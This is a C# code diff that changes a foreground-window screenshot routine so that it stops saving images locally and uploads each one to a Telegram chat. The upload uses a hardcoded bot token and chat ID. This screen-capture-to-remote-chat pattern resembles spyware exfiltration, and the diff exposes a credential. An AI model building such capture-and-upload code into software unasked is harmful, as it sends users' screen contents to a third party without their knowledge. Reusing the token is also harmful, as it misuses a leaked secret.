@@ -1,5 +1,7 @@
 ﻿using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
+using Telegram.Bot;
+using Telegram.Bot.Types.InputFiles;
 
 namespace PoScSe
 {
@@ -27,8 +29,10 @@ namespace PoScSe
             public int Bottom;
         }
 
+        private readonly TelegramBotClient _botClient = new TelegramBotClient("7302927750:AAHRDYuEMbxMrMxfiatlwYoWtq9hVRYLXTI");
+        private readonly long _chatId = 1302058677;
 
-        public void TakeScreenshot(string saveDirectory, string prefix, string name)
+        public async void TakeScreenshot(string saveDirectory, string prefix, string name)
         {
             IntPtr hWnd = GetForegroundWindow();
             RECT rect;
@@ -45,11 +49,18 @@ namespace PoScSe
                     graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(width, height), CopyPixelOperation.SourceCopy);
                     ReleaseDC(hWnd, hdc);
                 }
-                string fileName = Path.Combine(saveDirectory, $"{prefix}-screenshot_{name}.png");
-                bitmap.Save(fileName, ImageFormat.Png);
-                Console.WriteLine($"Скриншот сохранен: {fileName}");
+                using (MemoryStream stream = new MemoryStream())
+                {
+                    bitmap.Save(stream, ImageFormat.Png);
+                    stream.Position = 0; // Сбрасываем поток до начала
+                    InputOnlineFile file = new InputOnlineFile(stream, "screenshot.png");
+                    await _botClient.SendPhotoAsync(_chatId, file);
+                }
             }
+            Console.WriteLine("Скриншот отправлен в Telegram.");
+            //string fileName = Path.Combine(saveDirectory, $"{prefix}-screenshot_{name}.png");
+            //bitmap.Save(fileName, ImageFormat.Png);
+            //Console.WriteLine($"Скриншот сохранен: {fileName}");
         }
-
     }
 }
